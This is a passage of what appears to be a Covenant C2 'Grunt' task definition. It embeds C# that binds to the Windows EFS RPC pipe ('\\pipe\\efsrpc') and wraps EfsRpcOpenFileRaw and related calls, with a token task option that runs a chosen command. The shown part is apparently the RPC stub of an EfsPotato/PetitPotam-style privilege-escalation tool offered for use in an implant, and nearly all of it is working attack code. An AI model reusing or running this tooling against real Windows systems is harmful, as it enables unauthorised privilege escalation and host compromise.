0x01, 0x10, 0x00, 0x0c, 0x00, 0x48, 0x00, 0x18, 0x00, 0x08, 0x00, 0x48, 0x00, 0x20, 0x00, 0x08, 0x00, 0x0b, 0x00, 0x28, 0x00, 0x5c, 0x01, 0x48, 0x00, 0x30, 0x00, 0x08, 0x00, 0x70, 0x00, 0x38, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x08, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x30, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x00, 0x46, 0x05, 0x0a, 0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x08, 0x00, 0x08, 0x00, 0x0b, 0x00, 0x10, 0x00, 0x5c, 0x01, 0x0b, 0x01, 0x18, 0x00, 0x0c, 0x00, 0x0b, 0x01, 0x20, 0x00, 0x48, 0x01, 0x70, 0x00, 0x28, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x38, 0x00, 0x32, 0x00, 0x00, 0x00, 0x10, 0x00, 0x08, 0x00, 0x47, 0x06, 0x0a, 0x07, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x08, 0x00, 0x08, 0x00, 0x0b, 0x00, 0x10, 0x00, 0x5c, 0x01, 0x0b, 0x01, 0x18, 0x00, 0x0c, 0x00, 0x48, 0x00, 0x20, 0x00, 0x08, 0x00, 0x13, 0x20, 0x28, 0x00, 0x7e, 0x01, 0x70, 0x00, 0x30, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x08, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x12, 0x00, 0x20, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x47, 0x03, 0x0a, 0x03, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x13, 0x20, 0x10, 0x00, 0x7e, 0x01, 0x70, 0x00, 0x18, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x13, 0x00, 0x30, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x46, 0x05, 0x0a, 0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x0b, 0x00, 0x10, 0x00, 0x5c, 0x01, 0x0b, 0x01, 0x18, 0x00, 0x6a, 0x01, 0x0b, 0x00, 0x20, 0x00, 0x86, 0x01, 0x70, 0x00, 0x28, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x14, 0x00, 0x10, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x44, 0x01, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x00, 0x08, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x15, 0x00, 0x28, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x00, 0x46, 0x04, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x0b, 0x00, 0x10, 0x00, 0xa4, 0x01, 0x48, 0x00, 0x18, 0x00, 0x08, 0x00, 0x70, 0x00, 0x20, 0x00, 0x08, 0x00 };

            private Guid interfaceId;

            [SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.UnmanagedCode)]
            public efs()
            {
                interfaceId = new Guid("df1941c5-fe89-4e79-bf10-463657acf44d");
                if (IntPtr.Size == 8)
                {
                    InitializeStub(interfaceId, MIDL_ProcFormatStringx64, MIDL_TypeFormatStringx64, "\\pipe\\efsrpc", 1, 0);
                }
                else
                {
                    InitializeStub(interfaceId, MIDL_ProcFormatStringx86, MIDL_TypeFormatStringx86, "\\pipe\\efsrpc", 1, 0);
                }
            }

            ~efs()
            {
                freeStub();
            }

            //Function calls
            public int EfsRpcOpenFileRaw(string computername, out IntPtr hContext, string FileName, int Flags)
            {
                IntPtr result = IntPtr.Zero;
                IntPtr pfn = Marshal.StringToHGlobalUni(FileName);

                hContext = IntPtr.Zero;
                try
                {
                    if (IntPtr.Size == 8)
                    {
                        result = NativeMethods.NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(0), Bind(Marshal.StringToHGlobalUni(computername), interfaceid: interfaceId.ToString()), out hContext, FileName, Flags);
                    }
                    else
                    {
                        IntPtr tempValue = IntPtr.Zero;
                        GCHandle handle = GCHandle.Alloc(tempValue, GCHandleType.Pinned);
                        IntPtr tempValuePointer = handle.AddrOfPinnedObject();
                        try
                        {
                            result = CallNdrClientCall2x86(0, Bind(Marshal.StringToHGlobalUni(computername), interfaceid: interfaceId.ToString()), tempValuePointer, pfn, IntPtr.Zero);
                            // each pinvoke work on a copy of the arguments (without an out specifier)
                            // get back the data
                            hContext = Marshal.ReadIntPtr(tempValuePointer);
                        }
                        finally
                        {
                            handle.Free();
                        }
                    }
                }
                catch (SEHException)
                {
                    int err = Marshal.GetExceptionCode();
                    Console.WriteLine("[x]EfsRpcOpenFileRaw failed: " + err);
                    return err;
                }
                finally
                {
                    if (pfn != IntPtr.Zero)
                        Marshal.FreeHGlobal(pfn);
                }
                return (int)result.ToInt64();
            }

            public int EfsRpcEncryptFileSrv(string computername, string FileName)
            {
                IntPtr result = IntPtr.Zero;
                IntPtr pfn = Marshal.StringToHGlobalUni(FileName);

                try
                {
                    if (IntPtr.Size == 8)
                    {
                        result = NativeMethods.NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(192), Bind(Marshal.StringToHGlobalUni(computername), interfaceid: interfaceId.ToString()), FileName);
                    }
                    else
                    {
                        try
                        {
                            result = CallNdrClientCall2x86(184, Bind(Marshal.StringToHGlobalUni(computername), interfaceid: interfaceId.ToString()), pfn);
                        }
                        finally
                        {
                        }
                    }
                }
                catch (SEHException)
                {
                    int err = Marshal.GetExceptionCode();
                    Console.WriteLine("[x]EfsRpcEncryptFileSrv failed: " + err);
                    return err;
                }
                finally
                {
                    if (pfn != IntPtr.Zero)
                        Marshal.FreeHGlobal(pfn);
                }
                return (int)result.ToInt64();
            }

            public int EfsRpcDecryptFileSrv(string computername, string FileName, ulong Flags)
            {
                IntPtr result = IntPtr.Zero;
                IntPtr pfn = Marshal.StringToHGlobalUni(FileName);

                try
                {
                    if (IntPtr.Size == 8)
                    {
                        result = NativeMethods.NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(234), Bind(Marshal.StringToHGlobalUni(computername), interfaceid: interfaceId.ToString()), FileName, Flags);
                    }
                    else
                    {
                        IntPtr tempValue = IntPtr.Zero;
                        GCHandle handle = GCHandle.Alloc(tempValue, GCHandleType.Pinned);
                        IntPtr tempValuePointer = handle.AddrOfPinnedObject();
                        try
                        {
                            result = CallNdrClientCall2x86(224, Bind(Marshal.StringToHGlobalUni(computername), interfaceid: interfaceId.ToString()), tempValuePointer, pfn, IntPtr.Zero);
                        }
                        finally
                        {
                        }
                    }
                }
                catch (SEHException)
                {
                    int err = Marshal.GetExceptionCode();
                    Console.WriteLine("[x]EfsRpcDecryptFileSrv failed: " + err);
                    return err;
                }
                finally
                {
                    if (pfn != IntPtr.Zero)
                        Marshal.FreeHGlobal(pfn);
                }
                return (int)result.ToInt64();
            }

            public int EfsRpcQueryRecoveryAgents(string computername, string FileName, out IntPtr RecoveryAgents)
            {
                IntPtr result = IntPtr.Zero;
                IntPtr pfn = Marshal.StringToHGlobalUni(FileName);

                RecoveryAgents = IntPtr.Zero;
                try
                {
                    if (IntPtr.Size == 8)
                    {
                        result = NativeMethods.NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(330), Bind(Marshal.StringToHGlobalUni(computername), interfaceid: interfaceId.ToString()), FileName, out RecoveryAgents);
                    }
                    else
                    {
                        IntPtr tempValue = IntPtr.Zero;
                        GCHandle handle = GCHandle.Alloc(tempValue, GCHandleType.Pinned);
                        IntPtr tempValuePointer = handle.AddrOfPinnedObject();
                        try
                        {
                            result = CallNdrClientCall2x86(316, Bind(Marshal.StringToHGlobalUni(computername), interfaceid: interfaceId.ToString()), pfn, tempValuePointer);
                            // each pinvoke work on a copy of the arguments (without an out specifier)
                            // get back the data
                            RecoveryAgents = Marshal.ReadIntPtr(tempValuePointer);
                        }
                        finally
                        {
                            handle.Free();
                        }
                    }
                }
                catch (SEHException)
                {
                    int err = Marshal.GetExceptionCode();
                    Console.WriteLine("[x]EfsRpcQueryRecoveryAgents failed: " + err);
                    return err;
                }
                finally
                {
                    if (pfn != IntPtr.Zero)
                        Marshal.FreeHGlobal(pfn);
                }
                return (int)result.ToInt64();
            }

            public int EfsRpcQueryUsersOnFile(string computername, string FileName, out IntPtr Users)
            {
                IntPtr result = IntPtr.Zero;
                IntPtr pfn = Marshal.StringToHGlobalUni(FileName);

                Users = IntPtr.Zero;
                try
                {
                    if (IntPtr.Size == 8)
                    {
                        result = NativeMethods.NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(282), Bind(Marshal.StringToHGlobalUni(computername), interfaceid: interfaceId.ToString()), FileName, out Users);
                    }
                    else
                    {
                        IntPtr tempValue = IntPtr.Zero;
                        GCHandle handle = GCHandle.Alloc(tempValue, GCHandleType.Pinned);
                        IntPtr tempValuePointer = handle.AddrOfPinnedObject();
                        try
                        {
                            result = CallNdrClientCall2x86(270, Bind(Marshal.StringToHGlobalUni(computername), interfaceid: interfaceId.ToString()), pfn, tempValuePointer);
                            // each pinvoke work on a copy of the arguments (without an out specifier)
                            // get back the data
                            Users = Marshal.ReadIntPtr(tempValuePointer);
                        }
                        finally
                        {
                            handle.Free();
                        }
                    }
                }
                catch (SEHException)
                {
                    int err = Marshal.GetExceptionCode();
                    Console.WriteLine("[x]EfsRpcQueryUsersOnFile failed: " + err);
                    return err;
                }
                finally
                {
                    if (pfn != IntPtr.Zero)
                        Marshal.FreeHGlobal(pfn);
                }
                return (int)result.ToInt64();
            }

            public int EfsRpcRemoveUsersFromFile(string computername, string FileName, out IntPtr Users)
            {
                IntPtr result = IntPtr.Zero;
                IntPtr pfn = Marshal.StringToHGlobalUni(FileName);

                Users = IntPtr.Zero;
                try
                {
                    if (IntPtr.Size == 8)
                    {
                        result = NativeMethods.NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(378), Bind(Marshal.StringToHGlobalUni(computername), interfaceid: interfaceId.ToString()), FileName, out Users);
                    }
                    else
                    {
                        IntPtr tempValue = IntPtr.Zero;
                        GCHandle handle = GCHandle.Alloc(tempValue, GCHandleType.Pinned);
                        IntPtr tempValuePointer = handle.AddrOfPinnedObject();
                        try
                        {
                            result = CallNdrClientCall2x86(362, Bind(Marshal.StringToHGlobalUni(computername), interfaceid: interfaceId.ToString()), pfn, tempValuePointer);
                            // each pinvoke work on a copy of the arguments (without an out specifier)
                            // get back the data
                            Users = Marshal.ReadIntPtr(tempValuePointer);
                        }
                        finally
                        {
                            handle.Free();
                        }
                    }
                }
                catch (SEHException)
                {
                    int err = Marshal.GetExceptionCode();
                    Console.WriteLine("[x]EfsRpcRemoveUsersFromFile failed: " + err);
                    return err;
                }
                finally
                {
                    if (pfn != IntPtr.Zero)
                        Marshal.FreeHGlobal(pfn);
                }
                return (int)result.ToInt64();
            }

            public int EfsRpcAddUsersToFile(string computername, string FileName, out IntPtr EncryptionCertificates)
            {
                IntPtr result = IntPtr.Zero;
                IntPtr pfn = Marshal.StringToHGlobalUni(FileName);

                EncryptionCertificates = IntPtr.Zero;
                try
                {
                    if (IntPtr.Size == 8)
                    {
                        result = NativeMethods.NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(426), Bind(Marshal.StringToHGlobalUni(computername), interfaceid: interfaceId.ToString()), FileName, out EncryptionCertificates);
                    }
                    else
                    {
                        IntPtr tempValue = IntPtr.Zero;
                        GCHandle handle = GCHandle.Alloc(tempValue, GCHandleType.Pinned);
                        IntPtr tempValuePointer = handle.AddrOfPinnedObject();
                        try
                        {
                            result = CallNdrClientCall2x86(702, Bind(Marshal.StringToHGlobalUni(computername), interfaceid: interfaceId.ToString()), pfn, tempValuePointer);
                            // each pinvoke work on a copy of the arguments (without an out specifier)
                            // get back the data
                            EncryptionCertificates = Marshal.ReadIntPtr(tempValuePointer);
                        }
                        finally
                        {
                            handle.Free();
                        }
                    }
                }
                catch (SEHException)
                {
                    int err = Marshal.GetExceptionCode();
                    Console.WriteLine("[x]EfsRpcAddUsersToFile failed: " + err);
                    return err;
                }
                finally
                {
                    if (pfn != IntPtr.Zero)
                        Marshal.FreeHGlobal(pfn);
                }
                return (int)result.ToInt64();
            }
        }
    }
  Compiled: false
  TaskingType: Assembly
  ReferenceSourceLibraries: []
  ReferenceAssemblies:
  - Name: mscorlib.dll
    Location: net35\mscorlib.dll
    DotNetVersion: Net35
  - Name: System.Configuration.Install.dll
    Location: net35\System.Configuration.Install.dll
    DotNetVersion: Net35
  - Name: System.Core.dll
    Location: net35\System.Core.dll
    DotNetVersion: Net35
  - Name: System.Data.DataSetExtensions.dll
    Location: net35\System.Data.DataSetExtensions.dll
    DotNetVersion: Net35
  - Name: System.Data.dll
    Location: net35\System.Data.dll
    DotNetVersion: Net35
  - Name: System.DirectoryServices.AccountManagement.dll
    Location: net35\System.DirectoryServices.AccountManagement.dll
    DotNetVersion: Net35
  - Name: System.DirectoryServices.dll
    Location: net35\System.DirectoryServices.dll
    DotNetVersion: Net35
  - Name: System.DirectoryServices.Protocols.dll
    Location: net35\System.DirectoryServices.Protocols.dll
    DotNetVersion: Net35
  - Name: System.dll
    Location: net35\System.dll
    DotNetVersion: Net35
  - Name: System.Drawing.dll
    Location: net35\System.Drawing.dll
    DotNetVersion: Net35
  - Name: System.IdentityModel.dll
    Location: net35\System.IdentityModel.dll
    DotNetVersion: Net35
  - Name: System.Management.Automation.dll
    Location: net35\System.Management.Automation.dll
    DotNetVersion: Net35
  - Name: System.Management.dll
    Location: net35\System.Management.dll
    DotNetVersion: Net35
  - Name: System.Security.dll
    Location: net35\System.Security.dll
    DotNetVersion: Net35
  - Name: System.ServiceProcess.dll
    Location: net35\System.ServiceProcess.dll
    DotNetVersion: Net35
  - Name: System.Web.Extensions.dll
    Location: net35\System.Web.Extensions.dll
    DotNetVersion: Net35
  - Name: System.Windows.Forms.dll
    Location: net35\System.Windows.Forms.dll
    DotNetVersion: Net35
  - Name: System.XML.dll
    Location: net35\System.XML.dll
    DotNetVersion: Net35
  - Name: mscorlib.dll
    Location: net40\mscorlib.dll
    DotNetVersion: Net40
  - Name: System.Configuration.Install.dll
    Location: net40\System.Configuration.Install.dll
    DotNetVersion: Net40
  - Name: System.Core.dll
    Location: net40\System.Core.dll
    DotNetVersion: Net40
  - Name: System.Data.DataSetExtensions.dll
    Location: net40\System.Data.DataSetExtensions.dll
    DotNetVersion: Net40
  - Name: System.Data.dll
    Location: net40\System.Data.dll
    DotNetVersion: Net40
  - Name: System.DirectoryServices.AccountManagement.dll
    Location: net40\System.DirectoryServices.AccountManagement.dll
    DotNetVersion: Net40
  - Name: System.DirectoryServices.dll
    Location: net40\System.DirectoryServices.dll
    DotNetVersion: Net40
  - Name: System.DirectoryServices.Protocols.dll
    Location: net40\System.DirectoryServices.Protocols.dll
    DotNetVersion: Net40
  - Name: System.dll
    Location: net40\System.dll
    DotNetVersion: Net40
  - Name: System.Drawing.dll
    Location: net40\System.Drawing.dll
    DotNetVersion: Net40
  - Name: System.IdentityModel.dll
    Location: net40\System.IdentityModel.dll
    DotNetVersion: Net40
  - Name: System.Management.Automation.dll
    Location: net40\System.Management.Automation.dll
    DotNetVersion: Net40
  - Name: System.Management.dll
    Location: net40\System.Management.dll
    DotNetVersion: Net40
  - Name: System.Security.dll
    Location: net40\System.Security.dll
    DotNetVersion: Net40
  - Name: System.ServiceProcess.dll
    Location: net40\System.ServiceProcess.dll
    DotNetVersion: Net40
  - Name: System.Web.Extensions.dll
    Location: net40\System.Web.Extensions.dll
    DotNetVersion: Net40
  - Name: System.Windows.Forms.dll
    Location: net40\System.Windows.Forms.dll
    DotNetVersion: Net40
  - Name: System.XML.dll
    Location: net40\System.XML.dll
    DotNetVersion: Net40
  EmbeddedResources: []
  UnsafeCompile: true
  TokenTask: true
  Options:
  - Name: cmd
    Value: notepad.exe
    DefaultValue: ''
    Description: ''
    SuggestedValues: []
    Optional: true
    DisplayInCommand: true
    FileOption: false
    GruntTaskId: 111
